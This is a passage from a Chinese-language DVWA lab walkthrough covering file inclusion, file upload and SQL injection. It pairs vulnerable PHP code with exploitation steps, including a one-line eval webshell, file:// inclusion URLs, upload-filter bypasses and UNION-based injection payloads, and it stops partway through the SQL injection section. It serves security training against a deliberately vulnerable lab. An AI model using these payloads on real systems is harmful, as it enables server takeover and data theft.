class="string">'page'</span>];</span><br><span class="line">    </span><br><span class="line">    //Inputvalidation</span><br><span class="line">    <span class="keyword">if</span>(!fnmatch(<span class="string">"file*"</span>,<span class="variable">$file</span>)&amp;&amp;<span class="variable">$file</span>!=<span class="string">"include.php"</span>)&#123;</span><br><span class="line">       //Thisisn<span class="string">'tthepagewewant!</span></span><br><span class="line"><span class="string">    echo"ERROR:Filenotfound!";</span></span><br><span class="line"><span class="string">    exit;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="审计-10"><a href="#审计-10" class="headerlink" title="审计"></a>审计</h4><p>High级别的代码规定只能包含file开头的文件，可以利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个本地文件时，用的就是file协议。</p>
<h4 id="漏洞利用-8"><a href="#漏洞利用-8" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><blockquote>
<p><a href="http://dvwa.com/DVWA/vulnerabilities/fi/?page=file:///C:/xampp/htdocs/dvwa/php.ini" target="_blank" rel="noopener">http://dvwa.com/DVWA/vulnerabilities/fi/?page=file:///C:/xampp/htdocs/dvwa/php.ini</a></p>
</blockquote>
<h3 id="Impossible-3"><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;php</span><br><span class="line">//Thepagewewishtodisplay</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'page'</span>];</span><br><span class="line"></span><br><span class="line">//Onlyallowinclude.phporfile&#123;1..3&#125;.php</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>!=<span class="string">"include.php"</span>&amp;&amp;<span class="variable">$file</span>!=<span class="string">"file1.php"</span>&amp;&amp;<span class="variable">$file</span>!=<span class="string">"file2.php"</span>&amp;&amp;<span class="variable">$file</span>!=<span class="string">"file3.php"</span>)&#123;</span><br><span class="line">//Thisisn<span class="string">'tthepagewewant!</span></span><br><span class="line"><span class="string">echo"ERROR:Filenotfound!";</span></span><br><span class="line"><span class="string">exit;</span></span><br></pre></td></tr></table></figure>
<h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>使用了白名单机制进行防护，age参数必须为“include.php”、“file1.php”、“file2.php”、“file3.php”之一，彻底杜绝了文件包含漏洞。<br>无懈可击。</p>
<h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><p>文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。</p>
<p><img src="fileUpload01.png" alt=""></p>
<h3 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    // Where are we going to be writing to? </span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    // Can we move the file to the upload folder? </span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], <span class="variable">$target_path</span> ) ) &#123; </span><br><span class="line">        // No </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // Yes! </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&#123;<span class="variable">$target_path</span>&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-11"><a href="#审计-11" class="headerlink" title="审计"></a>审计</h4><p>服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。</p>
<h4 id="漏洞利用-9"><a href="#漏洞利用-9" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知。这里三个条件全都满足。</p>
<p>这时候我们就可以使用一句话木马以及中国菜刀混合使用</p>
<ul>
<li>上传文件hack.php</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'muma'</span>]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>上传成功，并且返回了上传的路径<br><img src="fileupload02.png" alt=""></p>
<p>打开中国菜刀，右键添加我们上传文件的所在路径,参数名（一句话木马口令）为muma</p>
<p><img src="fileupload04.png" alt=""></p>
<p>然后菜刀就会通过向服务器发送包含apple参数的post请求，在服务器上执行任意命令，获取webshell权限。</p>
<p>可以下载、修改服务器的所有文件。</p>
<p><img src="fileupload05.png" alt=""><br>感觉这漏洞有点惨，直接整站被黑了。</p>
<h3 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">    &lt;?php </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">        // Where are we going to be writing to? </span><br><span class="line">        <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">        <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line">    </span><br><span class="line">        // File information </span><br><span class="line">        <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">        <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ]; </span><br><span class="line">        <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line">    </span><br><span class="line">        // Is it an image? </span><br><span class="line">        <span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">"image/jpeg"</span> || <span class="variable">$uploaded_type</span> == <span class="string">"image/png"</span> ) &amp;&amp; </span><br><span class="line">            ( <span class="variable">$uploaded_size</span> &lt; 100000 ) ) &#123; </span><br><span class="line">    </span><br><span class="line">            // Can we move the file to the upload folder? </span><br><span class="line">            <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], <span class="variable">$target_path</span> ) ) &#123; </span><br><span class="line">                // No </span><br><span class="line">                <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span> &#123; </span><br><span class="line">                // Yes! </span><br><span class="line">                <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&#123;<span class="variable">$target_path</span>&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            // Invalid file </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    ?&gt; </span><br><span class="line">```    </span><br><span class="line"><span class="comment">#### 审计</span></span><br><span class="line"></span><br><span class="line">Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB）。</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 漏洞利用</span></span><br><span class="line"></span><br><span class="line">- 文件上传+文件包含</span><br><span class="line">因为对格式有限制，我们就把hack.php改为hack.png，像low级别的漏洞利用一样，虽然成功上传了文件，但是并不能成功获取webshell权限，在菜刀上无论进行什么操作都会返回如下信息。</span><br><span class="line">![](fileupload06.png)</span><br><span class="line"></span><br><span class="line">这是因为服务器将木马文件解析成了图片文件，因此向其发送post请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。</span><br><span class="line"></span><br><span class="line">那么现在问题是如何让服务器将我们这个图片解析为php文件呢，还记得文件包含漏洞吗，在php中，include中的文件都会把它当成php文件执行</span><br><span class="line">所以，我们借助上传文件漏洞，在菜刀中添加一下地址，</span><br><span class="line"></span><br><span class="line">http://dvwa.com/DVWA/vulnerabilities/<span class="keyword">fi</span>/?page=hthttp://tp://dvwa.com/DVWA/hackable/uploads/hack.png</span><br><span class="line"></span><br><span class="line">- 抓包修改文件类型</span><br><span class="line">直接使用burp对上传过程进行抓包，然后将filename改成php格式</span><br><span class="line">![](fileupload08.png)</span><br><span class="line">然后使用菜刀获取webshell权限</span><br><span class="line"></span><br><span class="line"><span class="comment">### High</span></span><br><span class="line"></span><br><span class="line">``` bash</span><br><span class="line">    &lt;?php </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">        // Where are we going to be writing to? </span><br><span class="line">        <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">        <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line">    </span><br><span class="line">        // File information </span><br><span class="line">        <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">        <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">'.'</span> ) + 1); </span><br><span class="line">        <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line">        <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ]; </span><br><span class="line">    </span><br><span class="line">        // Is it an image? </span><br><span class="line">        <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">"jpg"</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">"jpeg"</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">"png"</span> ) &amp;&amp; </span><br><span class="line">            ( <span class="variable">$uploaded_size</span> &lt; 100000 ) &amp;&amp; </span><br><span class="line">            getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123; </span><br><span class="line">    </span><br><span class="line">            // Can we move the file to the upload folder? </span><br><span class="line">            <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$uploaded_tmp</span>, <span class="variable">$target_path</span> ) ) &#123; </span><br><span class="line">                // No </span><br><span class="line">                <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span> &#123; </span><br><span class="line">                // Yes! </span><br><span class="line">                <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&#123;<span class="variable">$target_path</span>&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            // Invalid file </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-12"><a href="#审计-12" class="headerlink" title="审计"></a>审计</h4><p>High级别的代码读取文件名中最后一个”.”后的字符串，期望通过文件名来限制文件类型，因此要求上传文件名形式必须是”<em>.jpg”、”</em>.jpeg” 、”*.png”之一。同时，getimagesize函数更是限制了上传文件的文件头必须为图像类型。<br>不像上一个级别代码一样，只判断上传文件的类型，因此不能像上述直接抓包修改文件名字</p>
<h4 id="漏洞利用-10"><a href="#漏洞利用-10" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>将一句木马存储在图片文件当中，做法是使用copy命令将一句话木马php文件与图片文件合并<br><img src="fileupload10.png" alt=""></p>
<p>然后上菜刀，右键添加</p>
<blockquote>
<p><a href="http://dvwa.com/DVWA/vulnerabilities/fi/?page=file:///C:/xampp/htdocs/dvwa/hackable/uploads/hajk.jpg" target="_blank" rel="noopener">http://dvwa.com/DVWA/vulnerabilities/fi/?page=file:///C:/xampp/htdocs/dvwa/hackable/uploads/hajk.jpg</a></p>
</blockquote>
<h3 id="Impossible-4"><a href="#Impossible-4" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // File information </span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">'.'</span> ) + 1); </span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ]; </span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Where are we going to be writing to? </span><br><span class="line">    <span class="variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">'hackable/uploads/'</span>; </span><br><span class="line">    //<span class="variable">$target_file</span>   = basename( <span class="variable">$uploaded_name</span>, <span class="string">'.'</span> . <span class="variable">$uploaded_ext</span> ) . <span class="string">'-'</span>; </span><br><span class="line">    <span class="variable">$target_file</span>   =  md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">'.'</span> . <span class="variable">$uploaded_ext</span>; </span><br><span class="line">    <span class="variable">$temp_file</span>     = ( ( ini_get( <span class="string">'upload_tmp_dir'</span> ) == <span class="string">''</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">'upload_tmp_dir'</span> ) ) ); </span><br><span class="line">    <span class="variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">'.'</span> . <span class="variable">$uploaded_ext</span>; </span><br><span class="line"></span><br><span class="line">    // Is it an image? </span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">'jpg'</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">'jpeg'</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">'png'</span> ) &amp;&amp; </span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; 100000 ) &amp;&amp; </span><br><span class="line">        ( <span class="variable">$uploaded_type</span> == <span class="string">'image/jpeg'</span> || <span class="variable">$uploaded_type</span> == <span class="string">'image/png'</span> ) &amp;&amp; </span><br><span class="line">        getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) </span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$uploaded_type</span> == <span class="string">'image/jpeg'</span> ) &#123; </span><br><span class="line">            <span class="variable">$img</span> = imagecreatefromjpeg( <span class="variable">$uploaded_tmp</span> ); </span><br><span class="line">            imagejpeg( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, 100); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="variable">$img</span> = imagecreatefrompng( <span class="variable">$uploaded_tmp</span> ); </span><br><span class="line">            imagepng( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, 9); </span><br><span class="line">        &#125; </span><br><span class="line">        imagedestroy( <span class="variable">$img</span> ); </span><br><span class="line"></span><br><span class="line">        // Can we move the file to the web root from the temp folder? </span><br><span class="line">        <span class="keyword">if</span>( rename( <span class="variable">$temp_file</span>, ( getcwd() . DIRECTORY_SEPARATOR . <span class="variable">$target_path</span> . <span class="variable">$target_file</span> ) ) ) &#123; </span><br><span class="line">            // Yes! </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&lt;a href='<span class="variable">$&#123;target_path&#125;</span><span class="variable">$&#123;target_file&#125;</span>'&gt;<span class="variable">$&#123;target_file&#125;</span>&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            // No </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        // Delete any temp files </span><br><span class="line">        <span class="keyword">if</span>( file_exists( <span class="variable">$temp_file</span> ) ) </span><br><span class="line">            unlink( <span class="variable">$temp_file</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // Invalid file </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-13"><a href="#审计-13" class="headerlink" title="审计"></a>审计</h4><p>Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件，同时不返回文件路径以及文件名字，无懈可击。</p>
<h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。近期很火的大使馆接连被黑事件，据说黑客依靠的就是常见的SQL注入漏洞。</p>
<h3 id="手工注入思路"><a href="#手工注入思路" class="headerlink" title="手工注入思路"></a>手工注入思路</h3><p>sqlmap大家应该都知道，自动化注入神器，但是我们还是需要掌握手工注入，下面介绍手工注入的思路及步骤</p>
<blockquote>
<p>1.判断是否存在注入，注入是字符型还是数字型<br>   2.猜解SQL查询语句中的字段数<br>   3.确定显示的字段顺序<br>   4.获取当前数据库<br>   5.获取数据库中的表<br>   6.获取表中的字段名<br>   7.下载数据</p>
</blockquote>
<h3 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_REQUEST</span>[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Check database </span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="variable">$id</span>';"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) or die( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    // Get results </span><br><span class="line">    <span class="variable">$num</span> = mysql_numrows( <span class="variable">$result</span> ); </span><br><span class="line">    <span class="variable">$i</span>   = 0; </span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$i</span> &lt; <span class="variable">$num</span> ) &#123; </span><br><span class="line">        // Get values </span><br><span class="line">        <span class="variable">$first</span> = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">"first_name"</span> ); </span><br><span class="line">        <span class="variable">$last</span>  = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;<span class="variable">$id</span>&#125;&lt;br /&gt;First name: &#123;<span class="variable">$first</span>&#125;&lt;br /&gt;Surname: &#123;<span class="variable">$last</span>&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        // Increase loop count </span><br><span class="line">        <span class="variable">$i</span>++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-14"><a href="#审计-14" class="headerlink" title="审计"></a>审计</h4><p>Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。</p>
<h4 id="漏洞利用-11"><a href="#漏洞利用-11" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>在现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法看到源码基础上。</p>
<ul>
<li><p>判断是否存在注入，注入是字符型还是数字型<br><img src="sqlinjection01.png" alt=""><br><img src="sqlinjection02.png" alt=""><br>可以判断是存在字符型注入</p>
</li>
<li><p>猜解SQL查询语句中的字段数<br>输入1’ or 1=1 order by 1 #，查询成功：<br><img src="sqlinjection03.png" alt=""><br>依次尝试，发现在 order by 3的时候<br>输入1’ or 1=1 order by 3 #，查询失败：<br><img src="sqlinjection04.png" alt=""><br>说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</p>
</li>
<li><p>确定显示的字段顺序<br>输入1’ union select 1,2 #，查询成功：<br><img src="sqlinjection05.png" alt=""><br>确定字段是First name,Surname。</p>
</li>
<li><p>获取当前数据库<br>输入1’ union select 1,database() #，查询成功：<br><img src="sqlinjection06.png" alt=""><br>可以知道数据名字是dvwa</p>
</li>
<li><p>获取数据库中的表<br>输入1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：<br><img src="sqlinjection08.png" alt=""></p>
</li>
<li><p>获取表中的字段名<br>输入1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #，查询成功：<br><img src="sqlinjection09.png" alt=""><br>users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p>
</li>
